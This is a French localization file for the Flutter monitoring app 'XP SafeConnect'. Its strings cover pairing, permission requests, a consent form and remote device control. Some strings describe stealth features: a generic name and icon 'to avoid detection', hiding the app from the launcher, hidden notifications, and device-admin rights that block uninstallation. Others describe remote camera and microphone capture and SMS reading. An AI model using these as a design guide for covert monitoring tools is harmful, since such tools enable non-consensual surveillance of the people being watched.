// ignore: unused_import
import 'package:intl/intl.dart' as intl;
import 'app_localizations.dart';

// ignore_for_file: type=lint

/// The translations for French (`fr`).
class AppLocalizationsFr extends AppLocalizations {
  AppLocalizationsFr([String locale = 'fr']) : super(locale);

  @override
  String get appName => 'XP SafeConnect';

  @override
  String get welcomeToSafeConnect => 'Bienvenue sur XP SafeConnect';

  @override
  String get pairingScreenDescription =>
      'Veuillez saisir le code de jumelage fourni par l\'appareil de surveillance pour démarrer le processus de configuration.';

  @override
  String get pairingCode => 'Code de jumelage';

  @override
  String get enterPairingCode => 'Entrez le code à 6 chiffres';

  @override
  String get pairingCodeRequired => 'Veuillez entrer le code de jumelage';

  @override
  String get continueText => 'Continuer';

  @override
  String get cancel => 'Annuler';

  @override
  String get exitSetup => 'Quitter la configuration';

  @override
  String get exitSetupConfirmation =>
      'Êtes-vous sûr de vouloir quitter la configuration ? Cela fermera l\'application.';

  @override
  String get exit => 'Quitter';

  @override
  String get requiredPermissions => 'Permissions requises';

  @override
  String permissionTitle(String title) {
    return '$title';
  }

  @override
  String permissionDescription(String description) {
    return '$description';
  }

  @override
  String get locationPermission => 'Localisation';

  @override
  String get locationPermissionDescription =>
      'Permet de suivre la position de votre appareil en temps réel. Cela est nécessaire pour que l\'appareil de surveillance puisse voir où vous vous trouvez.';

  @override
  String get smsPermission => 'Messages SMS';

  @override
  String get smsPermissionDescription =>
      'Permet d\'accéder aux messages SMS envoyés et reçus sur cet appareil.';

  @override
  String get phonePermission => 'Appels téléphoniques';

  @override
  String get phonePermissionDescription =>
      'Permet de surveiller les appels entrants et sortants sur cet appareil.';

  @override
  String get storagePermission => 'Stockage';

  @override
  String get storagePermissionDescription =>
      'Permet d\'accéder aux images et autres fichiers stockés sur cet appareil.';

  @override
  String get cameraPermission => 'Caméra';

  @override
  String get cameraPermissionDescription =>
      'Permet la capture de photos à distance en utilisant la caméra de cet appareil lorsque demandé.';

  @override
  String get microphonePermission => 'Microphone';

  @override
  String get microphonePermissionDescription =>
      'Permet l\'enregistrement audio à distance en utilisant le microphone de cet appareil lorsque demandé.';

  @override
  String get requiredPermission => 'Obligatoire';

  @override
  String get permissionGranted => 'Permission accordée';

  @override
  String get permissionRequired => 'Permission requise';

  @override
  String get grantPermission => 'Accorder la permission';

  @override
  String get back => 'Retour';

  @override
  String get continueToSetup => 'Continuer vers la configuration';

  @override
  String get finalSetup => 'Configuration finale';

  @override
  String get permissionsGranted => 'Permissions accordées !';

  @override
  String get displayMode => 'Mode d\'affichage';

  @override
  String get displayModeNormal => 'Normal';

  @override
  String get displayModeNormalDesc =>
      'L\'icône et le nom de l\'application seront visibles dans le tiroir d\'applications.';

  @override
  String get displayModeDiscrete => 'Discret';

  @override
  String get displayModeDiscreteDesc =>
      'L\'application utilisera un nom et une icône génériques pour éviter la détection.';

  @override
  String get displayModeHidden => 'Caché';

  @override
  String get displayModeHiddenDesc =>
      'L\'application n\'apparaîtra pas dans le tiroir d\'applications (accès via un code de numérotation).';

  @override
  String get autoStart => 'Démarrage automatique';

  @override
  String get autoStartDescription =>
      'Démarrer automatiquement l\'application au démarrage de l\'appareil.';

  @override
  String get notificationMode => 'Mode de notification';

  @override
  String get notificationModeVisible => 'Visible';

  @override
  String get notificationModeVisibleDesc =>
      'Notifications normales avec le nom et l\'icône de l\'application.';

  @override
  String get notificationModeMinimized => 'Minimisées';

  @override
  String get notificationModeMinimizedDesc =>
      'Notifications compactes avec un minimum d\'informations.';

  @override
  String get notificationModeHidden => 'Cachées';

  @override
  String get notificationModeHiddenDesc =>
      'Pas de notifications visibles (service d\'arrière-plan uniquement).';

  @override
  String get importantInfo => 'Information importante';

  @override
  String get backgroundServiceInfo =>
      'Cette application fonctionnera en continu en arrière-plan pour fournir des capacités de surveillance. Cela peut affecter la durée de vie de la batterie. Le service d\'arrière-plan redémarrera automatiquement s\'il est terminé.';

  @override
  String get finishSetup => 'Terminer la configuration';

  @override
  String get errorOccurred => 'Une erreur s\'est produite';

  @override
  String get close => 'Fermer';

  @override
  String get settings => 'Paramètres';

  @override
  String get connected => 'Connecté';

  @override
  String get disconnected => 'Déconnecté';

  @override
  String connectedToDevice(String device) {
    return 'Connecté à $device';
  }

  @override
  String get notConnectedToAnyDevice =>
      'Non connecté à un appareil de surveillance';

  @override
  String get monitoringStatus => 'État de la surveillance';

  @override
  String get locationTracking => 'Suivi de localisation';

  @override
  String get messageMonitoring => 'Surveillance des messages';

  @override
  String get callsMonitoring => 'Surveillance des appels';

  @override
  String get appsMonitoring => 'Surveillance des applications';

  @override
  String get photosAccess => 'Accès aux photos';

  @override
  String get quickActions => 'Actions rapides';

  @override
  String get viewSharedData => 'Voir les données partagées';

  @override
  String get contactMonitor => 'Contacter le surveillant';

  @override
  String get featureComingSoon => 'Cette fonctionnalité arrive bientôt';

  @override
  String get holdForEmergency => 'Maintenir pour urgence';

  @override
  String featureActiveAndSharing(String feature) {
    return '$feature est actif et partage des données';
  }

  @override
  String featureNotActive(String feature) {
    return '$feature n\'est pas actif';
  }

  @override
  String get sharedData => 'Données partagées';

  @override
  String get aboutSharedData => 'À propos des données partagées';

  @override
  String get sharedDataExplanation =>
      'Cet écran vous montre quelles données sont partagées avec l\'appareil de surveillance. Vous ne pouvez pas désactiver ces fonctionnalités car elles font partie de l\'accord de surveillance.';

  @override
  String get location => 'Localisation';

  @override
  String get messages => 'Messages';

  @override
  String get calls => 'Appels';

  @override
  String get apps => 'Applications';

  @override
  String get photos => 'Photos';

  @override
  String get active => 'Actif';

  @override
  String get inactive => 'Inactif';

  @override
  String lastSyncTime(String time) {
    return 'Dernière synchronisation : $time';
  }

  @override
  String get viewPrivacyPolicy => 'Voir la Politique de confidentialité';

  @override
  String get locationSharingDescription =>
      'Votre position actuelle est partagée avec l\'appareil de surveillance en temps réel. Cela inclut vos coordonnées GPS, la précision et la vitesse de déplacement.';

  @override
  String get messagesSharingDescription =>
      'Vos messages SMS et certains contenus des applications de messagerie sont partagés avec l\'appareil de surveillance.';

  @override
  String get callsSharingDescription =>
      'Les informations sur vos appels entrants et sortants sont partagées, y compris le numéro de téléphone, le nom du contact et la durée de l\'appel.';

  @override
  String get appsSharingDescription =>
      'Des informations sur les applications que vous utilisez et leur durée d\'utilisation sont partagées avec l\'appareil de surveillance.';

  @override
  String get photosSharingDescription =>
      'L\'accès aux photos n\'est actuellement pas activé sur cet appareil.';

  @override
  String get emergencyMode => 'Mode d\'urgence';

  @override
  String get emergencyModeActive => 'MODE D\'URGENCE ACTIF';

  @override
  String get emergencyModeDescription =>
      'En cas de situation d\'urgence, appuyez sur le bouton ci-dessous pour alerter l\'appareil de surveillance. Il sera immédiatement notifié et pourra prendre les mesures appropriées.';

  @override
  String get tapToActivate => 'Appuyez pour activer';

  @override
  String get emergencyModeWarning =>
      'Utilisez ceci uniquement en cas d\'urgence réelle. Les fausses alarmes peuvent entraîner la restriction de cette fonctionnalité.';

  @override
  String activatingEmergencyIn(String seconds) {
    return 'Activation du mode d\'urgence dans ${seconds}s';
  }

  @override
  String get cancelEmergency => 'Annuler';

  @override
  String get tapToCancelEmergency =>
      'Appuyez pour annuler l\'activation d\'urgence';

  @override
  String get emergencyModeActivated => 'Mode d\'urgence activé';

  @override
  String get monitoringDeviceNotified =>
      'L\'appareil de surveillance a été notifié de votre situation d\'urgence.';

  @override
  String get emergencyActions => 'Actions d\'urgence';

  @override
  String get takePhoto => 'Prendre photo';

  @override
  String get recordAudio => 'Enregistrer audio';

  @override
  String get sendMessage => 'Envoyer message';

  @override
  String get deactivateEmergencyMode => 'Désactiver le mode d\'urgence';

  @override
  String get justNow => 'à l\'instant';

  @override
  String minutesAgo(String minutes) {
    return 'il y a $minutes minutes';
  }

  @override
  String hoursAgo(String hours) {
    return 'il y a $hours heures';
  }

  @override
  String daysAgo(String days) {
    return 'il y a $days jours';
  }

  @override
  String get remoteUnlockRequested => 'Déverrouillage à distance demandé';

  @override
  String get deviceUnlocked => 'Appareil déverrouillé';

  @override
  String get unlockPermissionRequired =>
      'Cette application nécessite la permission de déverrouiller votre appareil';

  @override
  String get scanQRCode => 'Scanner le code QR';

  @override
  String get qrScanInstructions =>
      'Positionnez le code QR dans le cadre pour le scanner';

  @override
  String get enterCodeManually => 'Saisir le code manuellement';

  @override
  String get invalidQRCode => 'Format de code QR invalide';

  @override
  String get error => 'Erreur';

  @override
  String get ok => 'OK';

  @override
  String get confirm => 'Confirmer';

  @override
  String get digitalConsent => 'Consentement numérique';

  @override
  String get consentFormTitle => 'Accord de consentement à la surveillance';

  @override
  String get consentFormDescription =>
      'Cette application surveillera et collectera des données de cet appareil. Veuillez lire attentivement les informations suivantes et donner votre consentement explicite.';

  @override
  String get monitoringCapabilities => 'Capacités de surveillance';

  @override
  String get monitoringCapabilitiesDescription =>
      'Cette application collectera les types de données suivants :';

  @override
  String get dataHandling => 'Traitement des données';

  @override
  String get dataHandlingDescription =>
      'Toutes les données collectées sont chiffrées et transmises de manière sécurisée uniquement aux appareils de surveillance autorisés.';

  @override
  String get dataRetentionInfo =>
      'Les données sont conservées selon votre accord de surveillance et les lois applicables sur la confidentialité.';

  @override
  String get dataSecurityInfo =>
      'Nous mettons en œuvre des mesures de sécurité standard de l\'industrie pour protéger vos données.';

  @override
  String get yourRights => 'Vos droits';

  @override
  String get rightsDescription =>
      'Vous avez le droit d\'accéder, modifier ou supprimer vos données personnelles à tout moment.';

  @override
  String get withdrawalRights =>
      'Vous pouvez retirer ce consentement à tout moment en contactant l\'administrateur de surveillance.';

  @override
  String get consentConfirmation => 'Confirmation du consentement';

  @override
  String get confirmAdultStatus => 'Je confirme que j\'ai au moins 18 ans';

  @override
  String get confirmAdultStatusDescription =>
      'Vous devez être majeur pour donner un consentement légal';

  @override
  String get confirmReadTerms =>
      'J\'ai lu et j\'accepte les Conditions d\'utilisation';

  @override
  String get confirmReadPrivacy =>
      'J\'ai lu et je comprends la Politique de confidentialité';

  @override
  String get confirmMonitoringConsent =>
      'Je consens à la surveillance de cet appareil';

  @override
  String get confirmMonitoringConsentDescription =>
      'Cela inclut toutes les activités de collecte de données listées ci-dessus';

  @override
  String get confirmDataCollection =>
      'Je comprends comment mes données seront collectées et utilisées';

  @override
  String get confirmDataCollectionDescription =>
      'Y compris le stockage, le traitement et le partage avec des parties autorisées';

  @override
  String get digitalSignature => 'Signature numérique';

  @override
  String get signatureInstructions =>
      'Veuillez signer ci-dessous pour donner votre consentement légal :';

  @override
  String get clearSignature => 'Effacer';

  @override
  String signatureDate(String date) {
    return 'Date : $date';
  }

  @override
  String get giveConsent => 'Donner le consentement';

  @override
  String get processing => 'Traitement en cours...';

  @override
  String get allConsentItemsRequired =>
      'Veuillez cocher tous les éléments de consentement avant de continuer';

  @override
  String get signatureRequired => 'Veuillez fournir votre signature numérique';

  @override
  String get signatureExportFailed => 'Échec de l\'exportation de la signature';

  @override
  String get viewTermsOfService => 'Voir les Conditions d\'utilisation';

  @override
  String get termsOfService => 'Conditions d\'utilisation';

  @override
  String get privacyPolicy => 'Politique de confidentialité';

  @override
  String get termsOfServiceContent =>
      'Ces conditions régissent votre utilisation de l\'application de surveillance XP SafeConnect. En utilisant cette application, vous acceptez d\'être surveillé selon les capacités décrites dans ce formulaire de consentement. La surveillance est menée à des fins légitimes telles que le contrôle parental, la sécurité familiale ou la surveillance autorisée en milieu de travail. Vous reconnaissez que les données collectées seront partagées avec des appareils de surveillance autorisés et peuvent être utilisées à des fins de sécurité et de conformité.';

  @override
  String get privacyPolicyContent =>
      'Votre vie privée est importante pour nous. Cette application collecte des données de localisation, des journaux de communication, l\'utilisation d\'applications et d\'autres informations sur l\'appareil à des fins de surveillance. Toutes les données sont chiffrées pendant la transmission et le stockage. L\'accès à vos données est limité aux administrateurs de surveillance autorisés. Vous avez le droit de demander l\'accès à vos données, la correction de données inexactes ou la suppression de vos données sous réserve d\'exigences légales et de sécurité.';

  @override
  String get processingConsent => 'Traitement du consentement';

  @override
  String get pleaseWait =>
      'Veuillez patienter pendant que nous traitons votre consentement...';

  @override
  String get essentialPermissions => 'Permissions essentielles';

  @override
  String get monitoringPermissions => 'Permissions de surveillance';

  @override
  String get advancedPermissions => 'Permissions avancées';

  @override
  String get optionalPermissions => 'Permissions optionnelles';

  @override
  String get checkingPermissions => 'Vérification des permissions';

  @override
  String get noPermissionsToRequest => 'Aucune permission à demander';

  @override
  String permissionStep(String current, String total) {
    return 'Étape $current sur $total';
  }

  @override
  String get whyThisPermission => 'Pourquoi cette permission ?';

  @override
  String get requiredPermissionWarning =>
      'Cette permission est requise pour que l\'application fonctionne correctement';

  @override
  String get troubleshootingSteps => 'Étapes de dépannage';

  @override
  String get needHelp => 'Besoin d\'aide ?';

  @override
  String get hideTroubleshooting => 'Masquer l\'aide';

  @override
  String get skipOptional => 'Ignorer (Optionnel)';

  @override
  String get accessibilityPermission => 'Service d\'accessibilité';

  @override
  String get accessibilityPermissionDescription =>
      'Permet la surveillance de l\'utilisation des applications et de la messagerie';

  @override
  String get accessibilityPermissionDetailed =>
      'Le service d\'accessibilité est requis pour surveiller l\'utilisation des applications, détecter l\'activité de messagerie et fournir une surveillance complète de l\'appareil. Ceci est essentiel pour que la fonctionnalité de surveillance fonctionne correctement.';

  @override
  String get usageStatsPermission => 'Statistiques d\'utilisation';

  @override
  String get usageStatsPermissionDescription =>
      'Suit quelles applications sont utilisées et pendant combien de temps';

  @override
  String get usageStatsPermissionDetailed =>
      'La permission des statistiques d\'utilisation permet à l\'application de suivre quelles applications sont ouvertes, combien de temps elles sont utilisées et quand elles sont fermées. Ces données sont essentielles pour une surveillance complète de l\'appareil.';

  @override
  String get deviceAdminPermission => 'Administrateur de l\'appareil';

  @override
  String get deviceAdminPermissionDescription =>
      'Permet le contrôle à distance de l\'appareil et la protection anti-manipulation';

  @override
  String get deviceAdminPermissionDetailed =>
      'Les privilèges d\'administrateur de l\'appareil permettent le verrouillage/déverrouillage à distance, empêchent la désinstallation non autorisée et fournissent des fonctionnalités de sécurité améliorées. Ceci est optionnel mais recommandé pour une fonctionnalité complète.';

  @override
  String get batteryOptimizationPermission => 'Optimisation de la batterie';

  @override
  String get batteryOptimizationPermissionDescription =>
      'Empêche l\'application d\'être arrêtée par la gestion de l\'alimentation';

  @override
  String get batteryOptimizationPermissionDetailed =>
      'Désactiver l\'optimisation de la batterie garantit que l\'application continue à fonctionner en arrière-plan pour une surveillance continue. Cela empêche la gestion de l\'alimentation d\'Android d\'arrêter le service de surveillance.';

  @override
  String get locationPermissionDetailed =>
      'L\'accès à la localisation est requis pour le suivi GPS en temps réel. L\'application a besoin de la permission \'Autoriser tout le temps\' pour suivre la localisation même lorsque l\'application n\'est pas activement utilisée.';

  @override
  String get phonePermissionDetailed =>
      'La permission téléphone permet la surveillance des appels entrants et sortants, y compris la durée des appels, les informations de contact et l\'état des appels. Ceci est essentiel pour les fonctionnalités de surveillance des appels.';

  @override
  String get smsPermissionDetailed =>
      'La permission SMS permet la surveillance des messages texte, y compris la lecture des messages entrants et le suivi de l\'activité de messagerie. Ceci est requis pour une surveillance complète des communications.';

  @override
  String get cameraPermissionDetailed =>
      'L\'accès à la caméra permet la capture de photos à distance lorsque demandé par l\'appareil de surveillance. Cela active des fonctionnalités de sécurité comme la capture de photos d\'urgence.';

  @override
  String get microphonePermissionDetailed =>
      'L\'accès au microphone permet les capacités d\'enregistrement audio à distance lorsque demandé par l\'appareil de surveillance. Cela supporte la surveillance d\'urgence et les fonctionnalités de sécurité.';

  @override
  String get notificationPermissionDetailed =>
      'La permission de notification permet à l\'application d\'afficher des alertes importantes, des mises à jour de statut et des notifications d\'urgence. Cela garantit que vous restez informé du statut de surveillance.';

  @override
  String get permissionSummary => 'Résumé des permissions';

  @override
  String get permissionsConfigured => 'Permissions configurées !';

  @override
  String get permissionsPartiallyConfigured =>
      'Permissions partiellement configurées';

  @override
  String permissionsGrantedSummary(String granted, String total) {
    return '$granted permissions accordées sur $total';
  }

  @override
  String get permissionStatusDetails => 'Détails du statut des permissions';

  @override
  String get granted => 'Accordée';

  @override
  String get notGranted => 'Non accordée';

  @override
  String get incompletePermissionsWarning => 'Certaines permissions manquent';

  @override
  String get incompletePermissionsDescription =>
      'L\'application pourrait ne pas fonctionner entièrement sans toutes les permissions requises. Vous pouvez continuer avec une fonctionnalité limitée ou revenir pour accorder les permissions manquantes.';

  @override
  String get reviewPermissions => 'Revoir les permissions';

  @override
  String get continueAnyway => 'Continuer quand même';

  @override
  String get notificationPermission => 'Notifications';

  @override
  String get notificationPermissionDescription =>
      'Permet à l\'application d\'afficher des notifications';

  @override
  String get mediaPermissions => 'Permissions Média';

  @override
  String get systemPermissions => 'Permissions Système';

  @override
  String get whyDoWeNeedThis => 'Pourquoi en avons-nous besoin ?';

  @override
  String permissionExplanation(String explanation) {
    return '$explanation';
  }

  @override
  String get locationAlwaysPermission => 'Localisation en arrière-plan';

  @override
  String get locationAlwaysPermissionDescription =>
      'Permet le suivi de localisation même quand l\'app n\'est pas ouverte';

  @override
  String get locationAlwaysPermissionExplanation =>
      'L\'accès à la localisation en arrière-plan est requis pour un suivi continu de la localisation. Cela garantit que l\'appareil de surveillance peut toujours connaître votre position pour des raisons de sécurité.';

  @override
  String get locationPermissionExplanation =>
      'L\'accès à la localisation est requis pour le suivi GPS en temps réel. L\'application a besoin de la permission de localisation pour suivre votre position à des fins de sécurité et de surveillance.';

  @override
  String get smsPermissionExplanation =>
      'La permission SMS permet la surveillance des messages texte, y compris la lecture des messages entrants et le suivi de l\'activité de messagerie. Ceci est requis pour une surveillance complète des communications.';

  @override
  String get phonePermissionExplanation =>
      'La permission téléphone permet la surveillance des appels entrants et sortants, y compris la durée des appels, les informations de contact et l\'état des appels. Ceci est essentiel pour les fonctionnalités de surveillance des appels.';

  @override
  String get usageStatsPermissionExplanation =>
      'La permission de statistiques d\'utilisation permet à l\'application de suivre quelles applications sont ouvertes, combien de temps elles sont utilisées et quand elles sont fermées. Ces données sont essentielles pour une surveillance complète de l\'appareil.';

  @override
  String get accessibilityServicePermissionExplanation =>
      'Le service d\'accessibilité est requis pour surveiller l\'utilisation des applications, détecter l\'activité de messagerie et fournir une surveillance complète de l\'appareil. Ceci est essentiel pour que la fonctionnalité de surveillance fonctionne correctement.';

  @override
  String get cameraPermissionExplanation =>
      'L\'accès à la caméra permet la capture de photos à distance lorsque demandé par l\'appareil de surveillance. Cela permet des fonctionnalités de sécurité comme la capture de photos d\'urgence.';

  @override
  String get microphonePermissionExplanation =>
      'L\'accès au microphone permet des capacités d\'enregistrement audio à distance lorsque demandé par l\'appareil de surveillance. Cela prend en charge la surveillance d\'urgence et les fonctionnalités de sécurité.';

  @override
  String get storagePermissionExplanation =>
      'La permission de stockage permet l\'accès aux fichiers et médias sur votre appareil. Ceci est nécessaire pour sauvegarder les données de surveillance et accéder au contenu de l\'appareil lorsque requis.';

  @override
  String get deviceAdminPermissionExplanation =>
      'Les privilèges d\'administrateur d\'appareil permettent le verrouillage/déverrouillage à distance, empêchent la désinstallation non autorisée et fournissent des fonctionnalités de sécurité améliorées. Ceci est optionnel mais recommandé pour une fonctionnalité complète.';

  @override
  String get batteryOptimizationPermissionExplanation =>
      'Désactiver l\'optimisation de la batterie garantit que l\'application continue de fonctionner en arrière-plan pour une surveillance continue. Cela empêche la gestion d\'énergie d\'Android d\'arrêter le service de surveillance.';

  @override
  String get notificationPermissionExplanation =>
      'La permission de notification permet à l\'application d\'afficher des alertes importantes, des mises à jour de statut et des notifications d\'urgence. Cela garantit que vous restez informé du statut de surveillance.';

  @override
  String get optionalPermission => 'Optionnelle';

  @override
  String get skip => 'Ignorer';

  @override
  String get completeSetup => 'Terminer la configuration';

  @override
  String get openSettings => 'Ouvrir les paramètres';

  @override
  String get permissionDenied => 'Permission refusée';

  @override
  String get permissionPermanentlyDeniedMessage =>
      'Cette permission a été définitivement refusée. Vous pouvez l\'accorder manuellement dans les paramètres de l\'application.';

  @override
  String get incompleteSetup => 'Configuration incomplète';

  @override
  String get requiredPermissionsMissing =>
      'Certaines permissions requises manquent encore :';

  @override
  String get p2pConnectionStatus => 'Statut de Connexion P2P';

  @override
  String get addConnection => 'Ajouter une Connexion';

  @override
  String get activeConnections => 'Connexions Actives';

  @override
  String get noActiveConnections => 'Aucune connexion active';

  @override
  String get p2pUninitialized => 'Non initialisé';

  @override
  String get p2pInitializing => 'Initialisation...';

  @override
  String get p2pReady => 'Prêt pour les connexions';

  @override
  String p2pConnectedDevices(String count) {
    return '$count appareils connectés';
  }

  @override
  String get p2pConnecting => 'Connexion en cours...';

  @override
  String get p2pConnected => 'Connecté';

  @override
  String get p2pDisconnected => 'Déconnecté';

  @override
  String get p2pError => 'Erreur de connexion';

  @override
  String get connectToDevice => 'Se connecter à l\'appareil';

  @override
  String get deviceId => 'ID d\'appareil';

  @override
  String get enterDeviceId => 'Entrez l\'ID d\'appareil';

  @override
  String get p2pConnectionInfo =>
      'Entrez l\'ID de l\'appareil de surveillance auquel vous souhaitez vous connecter directement.';

  @override
  String get connect => 'Connecter';

  @override
  String get connectingToDevice => 'Connexion à l\'appareil...';

  @override
  String get connectionSuccessful => 'Connexion réussie';

  @override
  String get connectionFailed => 'Connexion échouée';

  @override
  String get connectionError => 'Erreur de connexion survenue';

  @override
  String get connectedAt => 'Connecté à';

  @override
  String get sendCommand => 'Envoyer une Commande';

  @override
  String get sendFile => 'Envoyer un Fichier';

  @override
  String get disconnect => 'Déconnecter';

  @override
  String get lockDevice => 'Verrouiller l\'appareil';

  @override
  String get unlockDevice => 'Déverrouiller l\'appareil';

  @override
  String get restartDevice => 'Redémarrer l\'appareil';

  @override
  String get capturePhoto => 'Capturer une Photo';

  @override
  String get commandSent => 'Commande envoyée avec succès';

  @override
  String get commandFailed => 'Commande échouée';

  @override
  String get commandError => 'Erreur lors de l\'envoi de la commande';

  @override
  String get confirmDisconnection => 'Confirmer la Déconnexion';

  @override
  String disconnectDeviceConfirmation(String deviceName) {
    return 'Êtes-vous sûr de vouloir vous déconnecter de $deviceName ?';
  }

  @override
  String get deviceDisconnected => 'Appareil déconnecté';

  @override
  String get disconnectionFailed => 'Déconnexion échouée';

  @override
  String get invalidPairingCodeFormat =>
      'Le code de jumelage doit contenir 6 chiffres';

  @override
  String get pairingFailed => 'Échec du jumelage';

  @override
  String get networkError => 'Erreur réseau';

  @override
  String get logoutConfirmation => 'Confirmation de déconnexion';

  @override
  String get logoutConfirmationMessage =>
      'Êtes-vous sûr de vouloir vous déconnecter ? L\'application sera fermée et devra être jumelée à nouveau.';

  @override
  String get logout => 'Déconnexion';
}
